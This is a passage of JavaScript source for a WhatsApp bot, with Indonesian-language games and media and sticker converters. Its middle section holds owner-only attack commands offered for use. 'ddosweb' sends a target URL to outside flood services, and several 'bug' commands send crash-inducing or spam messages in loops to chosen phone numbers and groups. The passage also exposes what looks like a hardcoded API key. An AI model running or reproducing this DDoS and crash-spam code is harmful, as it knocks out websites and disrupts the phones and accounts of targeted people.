 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7bce2c048806d4a13f340.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7bce2c048806d4a13f340.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7bce2c048806d4a13f340.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7bce2c048806d4a13f340.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7bce2c048806d4a13f340.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 conn.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(30000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 conn.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7bce2c048806d4a13f340.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 conn.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await conn.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) conn.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break*/
//========================END============================//
case 'id': {
        if (!isCreator) return paycall(`*khusus Owner*`)
        paytod(`${m.chat}`)
        }
        break
case 'tlfn': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let ingponya = text.split('|')[0] ? text.split('|')[0] : '-'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": Date.now(),
"title": `${ingponya}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
//========================DDOS WEBSITE============================//
case 'ddosweb': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) throw `Masukkan URL!\n\n*Contoh:* ${command} www.google.com|60`;
let [urlnya, jumlahe] = text.split`|`
if (!urlnya) return paycall(`Example : ${prefix + command} www.google.com|60`)
if (!jumlahe) return paycall(`Example : ${prefix + command} www.google.com|60`)
let nyeh = await fetchJson(`https://simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
let nyeh2 = await fetchJson(`https://shieldid.site/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
let nyeh3 = await fetchJson(`https://api2.simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
let nyeh4 = await fetchJson(`https://api3.simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
let nyeh5 = await fetchJson(`https://api4.simanbumbu.shop/rapid?time=${jumlahe}&th=80&ra=512&url=${urlnya}`);
try {
await conn.sendMessage(from, {text: done }, {quoted: m})
} catch (error) {
        console.error(error);
        replyerror('MAAF TERJADI KESALAHAN SAAT MENG EXECUTE');
    }
}
break
case 'proxylist': {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
let proxynya = await fetchJson(`https://shieldid.site/proxy`);
let proxynya2 = await fetchJson(`https://simanbumbu.shop/proxy`);
let proxynya3 = await fetchJson(`https://api2.simanbumbu.shop/proxy`);
let proxynya4 = await fetchJson(`https://api3.simanbumbu.shop/proxy`);
let proxynya5 = await fetchJson(`https://api4.simanbumbu.shop/proxy`);
await conn.sendMessage(from, {text: done }, {quoted: m})
} catch (error) {
        console.error(error);
        replyerror('MAAF TERJADI KESALAHAN SAAT MENGAMBIL PROXY');
    }
}
break
//========================BUG WHATSAPP=========================//
case 'bugnew2': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!args[0]) return paytod(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxx|4`)
 let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.relayMessage(nomor,{
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{quoted: newbugaha})
await sleep(3000)
}
paytod(`*Successfully sent Bug To ${nomor} Please pause for 3 minutes*`)
}
break
case 'bugnew':{
if (!isCreator) return m.reply(`*khusus Owner*`)
 if (!args[0]) return paytod(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx|5`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
await sleep(3000)
}
paytod(`*Berhasil mengirim Bug*`)
}
break
case 'sendbug': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
}
}
break
case 'oy': {
if (!isCreator) return m.reply("ngapain?") 
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
await sleep(2000)
conn.relayMessage(nomor, call, {})
await sleep(2000)
}
}
break
case 'oygc': {
if (!isCreator) return m.reply("ngapain?") 
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: newbugaha })
await sleep(2000)
}
}
break
case 'santet': {
if (!isCreator) return
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: newbugaha })
await sleep(60* secon)
}
}
break
case 'tesaja': {
conn.sendMessage(m.chat, { sticker : thumb }, { quoted:shinuwu })
}
break
case 'sendbuggc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugpc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah; i++) {
var invite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
         "groupJid": "120363144695962190@g.us",
	     "inviteCode": "63bqvAyYvuOQJtwf",
		 "inviteExpiration": "1689703732",
         "groupName": `${vapi()} ${philips}`,
         "jpegThumbnail": thumb,
         "caption": `${num}`
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(num, invite.message, { messageId: invite.key.id })
await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(60* secon)
}
}
break
case 'sendbugtroli': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: newbugaha })
conn.relayMessage(nomor, troli.message, { messageId: troli.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugtroligc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troligc = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troligc.message, { messageId: troligc.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugstik': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
}
}
break
case 'bugtxt': {
if (!isCreator) return m.reply(`*khusus Owner*`)
 let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: newbugaha})
await sleep(1000)
}
}
break
case 'jadikatalog': {
if (!isCreator) return paycall(`*khusus Owner*`)
let media = await quoted.download()
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": thumb,
"title": `${text} ${philips}`,
"description": `${text} ${vapi()}`,
"productImageCount": 999999999,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `${text}`,
"footerText": `${text}`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'tokatalog': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let atas = text.split('|')[0] ? text.split('|')[0] : '-'
let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let media = await quoted.download()
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "6764236690333549",
"jpegThumbnail": thumb,
"title": `${atas}`,
"description": `${bawah}`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
"footerText": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 999,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//========================BUG WHATSAPP=========================//
case 'setpp': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!quoted) return paycall(`Send/Reply Images With Captions ${prefix+command}`)
if (!/image/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var media = await conn.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
var { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await conn.updateProfilePicture(botNumber, { url: media }) }
reply('DONE')
} catch { reply('Gagal Mengganti Photo Profile') }
}
break
//STICKER
case 's': case 'sticker': case 'stiker': {
if (!quoted) return paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: global.packname,
                  author: global.author
               })
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
               })
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
               })
            } else {
               paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
            }
         }
         break

case 'telestik': {
	if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let res = await Telesticker(args[0])
		await m.reply(`Sending ${res.length} stickers...`)
		if (m.isGroup && res.length > 30) {
			await m.reply('Jumlah stiker lebih dari 30, bot akan mengirimkannya dalam obrolan pribadi.')
			for (let i = 0; i < res.length; i++) {
				await conn.sendImageAsSticker(m.sender, res[i].url, m, {
                  packname: global.packname,
                  author: global.author
               })
			}
		} else {
			for (let i = 0; i < res.length; i++) {
				await conn.sendImageAsSticker(m.chat, res[i].url, m, {
                  packname: global.packname,
                  author: global.author
               })
			}
		}
	} else throw 'Input Query / Telesticker Url'
}
break
case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return paycall(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return paycall(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
case 'toimg': {
	await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return paycall(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await conn.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            conn.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return paycall(`Please reply to non animated sticker`)
    }
    break
case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'towav': {
            if (/document/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            let media = await quoted.download()
            let { toWav } = require('./lib/converter')
            let audio = await toWav(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/x-mav', fileName: `Convert By ${conn.user.name}.wav`}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
            }
            break
            case 'togif': {
                if (!quoted) return paycall('Reply video')
                if (!/webp/.test(mime)) return paycall(`reply sticker with caption *${prefix + command}*`)
                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
            }
            break
case 'tomp4': case 'tovideo': case 'tovid': {
                if (!quoted) return paycall('Reply to Sticker')
                if (!/webp/.test(mime)) return paycall(`reply sticker with caption *${prefix + command}*`)
                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
            }
            break
case 'swm': case 'take':
         case 'wm': {
            if (!quoted) return paycall(`Where is the text?`)
            if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
            } else if (/video/.test(mime)) {
